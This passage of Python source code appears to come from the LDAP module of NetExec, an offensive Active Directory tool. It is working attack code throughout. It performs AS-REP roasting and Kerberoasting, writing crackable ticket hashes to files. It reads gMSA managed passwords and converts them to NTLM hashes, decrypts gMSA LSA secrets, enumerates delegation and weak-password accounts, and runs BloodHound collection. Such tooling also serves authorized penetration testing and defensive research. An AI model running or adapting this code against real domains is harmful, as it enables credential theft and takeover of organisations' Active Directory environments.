                    pwdLastSet = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))

                    if mustCommit is True:
                        answers.append(
                            [
                                sAMAccountName,
                                memberOf,
                                pwdLastSet,
                                lastLogon,
                                userAccountControl,
                            ]
                        )
                except Exception as e:
                    self.logger.debug("Exception:", exc_info=True)
                    self.logger.debug(f"Skipping item, cannot process due to error {e}")
            if len(answers) > 0:
                for user in answers:
                    hash_TGT = KerberosAttacks(self).get_tgt_asroast(user[0])
                    if hash_TGT:
                        self.logger.highlight(f"{hash_TGT}")
                        with open(self.args.asreproast, "a+") as hash_asreproast:
                            hash_asreproast.write(f"{hash_TGT}\n")
                return True
            else:
                self.logger.highlight("No entries found!")
        else:
            self.logger.fail("Error with the LDAP account used")

    def kerberoasting(self):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
        attributes = [
            "servicePrincipalName",
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        resp_parse = parse_result_attributes(resp)
        self.logger.debug(f"Search Filter: {searchFilter}")
        self.logger.debug(f"Attributes: {attributes}")
        self.logger.debug(f"Response: {resp}")
        if not resp:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []

            for item in resp_parse:
                mustCommit = False
                sAMAccountName = ""
                memberOf = ""
                SPNs = []
                pwdLastSet = ""
                userAccountControl = 0
                lastLogon = "N/A"
                delegation = ""
                try:
                    sAMAccountName = item.get("sAMAccountName", "")
                    mustCommit = sAMAccountName is not None
                    userAccountControl = int(item.get("userAccountControl", 0))
                    memberOf = str(item.get("memberOf", " "))
                    if userAccountControl & UF_TRUSTED_FOR_DELEGATION:
                        delegation = "unconstrained"
                    elif userAccountControl & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                        delegation = "constrained"
                    pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
                    lastLogon = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))
                    SPNs = [str(spn) for spn in item.get("servicePrincipalName")]

                    if mustCommit is True:
                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
                            self.logger.highlight(f"Bypassing disabled account {sAMAccountName} ")
                        else:
                            answers += [[spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation] for spn in SPNs]
                except Exception as e:
                    nxc_logger.error(f"Skipping item, cannot process due to error {e!s}")

            if len(answers) > 0:
                self.logger.display(f"Total of records returned {len(answers):d}")
                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                self.logger.debug(f"TGT: {TGT}")
                if TGT:
                    dejavue = []
                    for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
                        if sAMAccountName not in dejavue:
                            downLevelLogonName = self.targetDomain + "\\" + sAMAccountName

                            try:
                                principalName = Principal()
                                principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                                principalName.components = [downLevelLogonName]

                                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                                    principalName,
                                    self.domain,
                                    self.kdcHost,
                                    TGT["KDC_REP"],
                                    TGT["cipher"],
                                    TGT["sessionKey"],
                                )
                                r = KerberosAttacks(self).output_tgs(
                                    tgs,
                                    oldSessionKey,
                                    sessionKey,
                                    sAMAccountName,
                                    self.targetDomain + "/" + sAMAccountName,
                                )
                                self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
                                self.logger.highlight(f"{r}")
                                if self.args.kerberoasting:
                                    with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                        hash_kerberoasting.write(r + "\n")
                                dejavue.append(sAMAccountName)
                            except Exception as e:
                                self.logger.debug("Exception:", exc_info=True)
                                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                    return True
                else:
                    self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
            else:
                self.logger.highlight("No entries found!")
        self.logger.fail("Error with the LDAP account used")

    def query(self):
        """
        Query the LDAP server with the specified filter and attributes.
        Example usage:
            --query "(sAMAccountName=Administrator)" "sAMAccountName pwdLastSet memberOf"
        """
        search_filter = self.args.query[0]
        attributes = [attr.strip() for attr in self.args.query[1].split(" ")]
        if len(attributes) == 1 and attributes[0] == "":
            attributes = None
        if not search_filter:
            self.logger.fail("No filter specified")
            return
        self.logger.debug(f"Querying LDAP server with filter: {search_filter} and attributes: {attributes}")
        try:
            resp = self.search(search_filter, attributes, 0)
            resp_parse = parse_result_attributes(resp)
        except LDAPFilterSyntaxError as e:
            self.logger.fail(f"LDAP Filter Syntax Error: {e}")
            return

        for item in resp_parse:
            self.logger.success(f"Response for object: {item.get('distinguishedName')}")
            for attr, value in item.items():
                if isinstance(value, list):
                    self.logger.highlight(f"{attr:<20}: {' '.join(value)}")
                elif isinstance(value, str) and not value.isprintable():
                    # Convert non-printable strings to hex format
                    self.logger.highlight(f"{attr:<20}: {value.encode('latin1').hex()}")
                else:
                    self.logger.highlight(f"{attr:<20}: {value}")

    def find_delegation(self):
        def printTable(items, header):
            colLen = []

            # Calculating maximum lenght before parsing CN.
            for i, col in enumerate(header):
                rowMaxLen = max(len(row[1].split(",")[0].split("CN=")[-1]) for row in items) if i == 1 else max(len(str(row[i])) for row in items)
                colLen.append(max(rowMaxLen, len(col)))

            # Create the format string for each row
            outputFormat = " ".join([f"{{{num}:{width}s}}" for num, width in enumerate(colLen)])

            # Print header
            self.logger.highlight(outputFormat.format(*header))
            self.logger.highlight(" ".join(["-" * itemLen for itemLen in colLen]))

            # Print rows
            for row in items:
                # Get first CN value.
                if "CN=" in row[1]:
                    row[1] = row[1].split(",")[0].split("CN=")[-1]

                # Added join for DelegationRightsTo
                row[3] = ", ".join(str(x) for x in row[3]) if isinstance(row[3], list) else row[3]

                self.logger.highlight(outputFormat.format(*row))

        # Building the search filter
        search_filter = (f"(&(|(UserAccountControl:1.2.840.113556.1.4.803:={UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION})"
                         f"(UserAccountControl:1.2.840.113556.1.4.803:={UF_TRUSTED_FOR_DELEGATION})"
                         "(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))"
                         f"(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})))")
        # f"(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_SERVER_TRUST_ACCOUNT})))")  This would filter out RBCD to DCs

        attributes = ["sAMAccountName", "pwdLastSet", "userAccountControl", "objectCategory",
                      "msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-AllowedToDelegateTo"]

        resp = self.search(search_filter, attributes)
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")
        resp_parse = parse_result_attributes(resp)

        for item in resp_parse:
            sAMAccountName = ""
            userAccountControl = 0
            delegation = ""
            objectType = ""
            rightsTo = []
            protocolTransition = 0

            try:
                sAMAccountName = item["sAMAccountName"]

                userAccountControl = int(item["userAccountControl"])
                objectType = item.get("objectCategory")

                # Filter out DCs, unconstrained delegation to DCs is not a useful information
                if userAccountControl & UF_TRUSTED_FOR_DELEGATION and not userAccountControl & UF_SERVER_TRUST_ACCOUNT:
                    delegation = "Unconstrained"
                    rightsTo.append("N/A")
                elif userAccountControl & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                    delegation = "Constrained w/ Protocol Transition"
                    protocolTransition = 1

                if item.get("msDS-AllowedToDelegateTo") is not None:
                    if protocolTransition == 0:
                        delegation = "Constrained"
                    rightsTo = item.get("msDS-AllowedToDelegateTo")

                # Not an elif as an object could both have RBCD and another type of delegation
                if item.get("msDS-AllowedToActOnBehalfOfOtherIdentity") is not None:
                    databyte = item.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
                    rbcdRights = []
                    rbcdObjType = []
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(databyte))
                    if len(sd["Dacl"].aces) > 0:
                        search_filter = "(&(|"
                        for ace in sd["Dacl"].aces:
                            search_filter += "(objectSid=" + ace["Ace"]["Sid"].formatCanonical() + ")"
                        search_filter += f")(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})))"
                        delegUserResp = self.search(search_filter, attributes=["sAMAccountName", "objectCategory"])
                        delegUserResp_parse = parse_result_attributes(delegUserResp)

                        for rbcd in delegUserResp_parse:
                            rbcdRights.append(str(rbcd.get("sAMAccountName")))
                            rbcdObjType.append(str(rbcd.get("objectCategory")))

                        for rights, objType in zip(rbcdRights, rbcdObjType):
                            answers.append([rights, objType, "Resource-Based Constrained", sAMAccountName])

                if delegation in ["Unconstrained", "Constrained", "Constrained w/ Protocol Transition"]:
                    answers.append([sAMAccountName, objectType, delegation, rightsTo])

            except Exception as e:
                self.logger.error(f"Skipping item, cannot process due to error {e}")

        if answers:
            printTable(answers, header=["AccountName", "AccountType", "DelegationType", "DelegationRightsTo"])
        else:
            self.logger.fail("No entries found!")

    def trusted_for_delegation(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        resp_parse = parse_result_attributes(resp)

        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp_parse:
            mustCommit = False
            sAMAccountName = ""
            memberOf = ""
            pwdLastSet = ""
            userAccountControl = 0
            lastLogon = "N/A"
            try:
                sAMAccountName = item.get("sAMAccountName", "")
                mustCommit = sAMAccountName is not None
                userAccountControl = "0x%x" % int(item.get("userAccountControl", 0))
                memberOf = str(item.get("memberOf", " "))
                pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
                lastLogon = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))

                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")

    def password_not_required(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"
        try:
            self.logger.debug(f"Search Filter={searchFilter}")
            resp = self.ldap_connection.search(
                searchBase=self.baseDN,
                searchFilter=searchFilter,
                attributes=[
                    "sAMAccountName",
                    "pwdLastSet",
                    "MemberOf",
                    "userAccountControl",
                    "lastLogon",
                ],
                sizeLimit=0,
            )
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                self.logger.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
            else:
                return False
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")
        resp_parse = parse_result_attributes(resp)

        for item in resp_parse:
            status = "enabled"
            try:
                sAMAccountName = item.get("sAMAccountName", "")
                mustCommit = sAMAccountName is not None
                userAccountControl = int(item.get("userAccountControl", 0))
                if userAccountControl & 2:
                    status = "disabled"
                userAccountControl = f"0x{int(item.get('userAccountControl', 0)):x}"
                memberOf = str(item.get("memberOf", " "))
                pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
                lastLogon = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))

                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                            status,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e!s}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(f"User: {value[0]} Status: {value[5]}")
        else:
            self.logger.fail("No entries found!")

    def admin_count(self):
        # Building the search filter
        searchFilter = "(adminCount=1)"
        attributes = [
            "sAMAccountName",
            "pwdLastSet",
            "MemberOf",
            "userAccountControl",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        resp_parse = parse_result_attributes(resp)
        answers = []
        self.logger.debug(f"Total of records returned {len(resp):d}")

        for item in resp_parse:
            try:    
                sAMAccountName = item.get("sAMAccountName", "")
                mustCommit = sAMAccountName is not None
                userAccountControl = f"0x{int(item.get('userAccountControl', 0)):x}"
                memberOf = str(item.get("memberOf", " "))
                pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
                lastLogon = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))

                if mustCommit is True:
                    answers.append(
                        [
                            sAMAccountName,
                            memberOf,
                            pwdLastSet,
                            lastLogon,
                            userAccountControl,
                        ]
                    )
            except Exception as e:
                self.logger.debug("Exception:", exc_info=True)
                self.logger.debug(f"Skipping item, cannot process due to error {e!s}")
        if len(answers) > 0:
            self.logger.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.fail("No entries found!")

    def gmsa(self):
        self.logger.display("Getting GMSA Passwords")
        search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
        gmsa_accounts = self.ldap_connection.search(
            searchBase=self.baseDN,
            searchFilter=search_filter,
            attributes=[
                "sAMAccountName",
                "msDS-ManagedPassword",
                "msDS-GroupMSAMembership",
            ],
            sizeLimit=0,
        )
        if gmsa_accounts:
            self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

            for item in gmsa_accounts:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName = ""
                passwd = ""
                for attribute in item["attributes"]:
                    if str(attribute["type"]) == "sAMAccountName":
                        sAMAccountName = str(attribute["vals"][0])
                    if str(attribute["type"]) == "msDS-ManagedPassword":
                        data = attribute["vals"][0].asOctets()
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        currentPassword = blob["CurrentPassword"][:-2]
                        ntlm_hash = MD4.new()
                        ntlm_hash.update(currentPassword)
                        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {sAMAccountName:<20} NTLM: {passwd}")
        return True

    def decipher_gmsa_name(self, domain_name=None, account_name=None):
        # https://aadinternals.com/post/gmsa/
        gmsa_account_name = (domain_name + account_name).upper()
        self.logger.debug(f"GMSA name for {gmsa_account_name}")
        bin_account_name = gmsa_account_name.encode("utf-16le")
        bin_hash = hmac.new(bytes("", "latin-1"), msg=bin_account_name, digestmod=hashlib.sha256).digest()
        hex_letters = "0123456789abcdef"
        str_hash = ""
        for b in bin_hash:
            str_hash += hex_letters[b & 0x0F]
            str_hash += hex_letters[b >> 0x04]
        self.logger.debug(f"Hash2: {str_hash}")
        return str_hash

    def gmsa_convert_id(self):
        if self.args.gmsa_convert_id:
            if len(self.args.gmsa_convert_id) != 64:
                self.logger.fail("Length of the gmsa id not correct :'(")
            else:
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldap_connection.search(
                    searchBase=self.baseDN,
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                )
                if gmsa_accounts:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == self.args.gmsa_convert_id:
                                    self.logger.highlight(f"Account: {sAMAccountName:<20} ID: {self.args.gmsa_convert_id}")
                                    break
        else:
            self.logger.fail("No string provided :'(")

    def gmsa_decrypt_lsa(self):
        if self.args.gmsa_decrypt_lsa:
            if "_SC_GMSA_{84A78B8C" in self.args.gmsa_decrypt_lsa:
                gmsa = self.args.gmsa_decrypt_lsa.split("_")[4].split(":")
                gmsa_id = gmsa[0]
                gmsa_pass = gmsa[1]
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldap_connection.search(
                    searchBase=self.baseDN,
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                )
                if gmsa_accounts:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for item in gmsa_accounts:
                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                            continue
                        sAMAccountName = ""
                        for attribute in item["attributes"]:
                            if str(attribute["type"]) == "sAMAccountName":
                                sAMAccountName = str(attribute["vals"][0])
                                if self.decipher_gmsa_name(self.domain.split(".")[0], sAMAccountName[:-1]) == gmsa_id:
                                    gmsa_id = sAMAccountName
                                    break
                # convert to ntlm
                data = bytes.fromhex(gmsa_pass)
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob["CurrentPassword"][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {gmsa_id:<20} NTLM: {passwd}")
        else:
            self.logger.fail("No string provided :'(")

    def bloodhound(self):
        auth = ADAuthentication(
            username=self.username,
            password=self.password,
            domain=self.domain,
            lm_hash=self.nthash,
            nt_hash=self.nthash,
            aeskey=self.aesKey,
            kdc=self.kdcHost,
            auth_method="auto",
        )
        ad = AD(
            auth=auth,
            domain=self.domain,
            nameserver=self.args.dns_server,
            dns_tcp=self.args.dns_tcp,
            dns_timeout=self.args.dns_timeout,
        )
        collect = resolve_collection_methods("Default" if not self.args.collection else self.args.collection)
        if not collect:
            return
        self.logger.highlight("Resolved collection methods: " + ", ".join(list(collect)))

        self.logger.debug("Using DNS to retrieve domain information")
        ad.dns_resolve(domain=self.domain)

        if self.args.kerberos:
            self.logger.highlight("Using kerberos auth without ccache, getting TGT")
            auth.get_tgt()
        if self.args.use_kcache:
            self.logger.highlight("Using kerberos auth from ccache")
            auth.load_ccache()

        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
        bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
        bloodhound.connect()

        bloodhound.run(
            collect=collect,
            num_workers=10,
            disable_pooling=False,
            timestamp=timestamp,
            fileNamePrefix=self.output_filename.split("/")[-1],
            computerfile=None,
            cachefile=None,
            exclude_dcs=False,
        )

        self.output_filename += f"_{timestamp}"

        self.logger.highlight(f"Compressing output into {self.output_filename}bloodhound.zip")
        list_of_files = os.listdir(os.getcwd())
        with ZipFile(self.output_filename + "bloodhound.zip", "w") as z:
            for each_file in list_of_files:
                if each_file.startswith(self.output_filename.split("/")[-1]) and each_file.endswith("json"):
                    z.write(each_file)
                    os.remove(each_file)
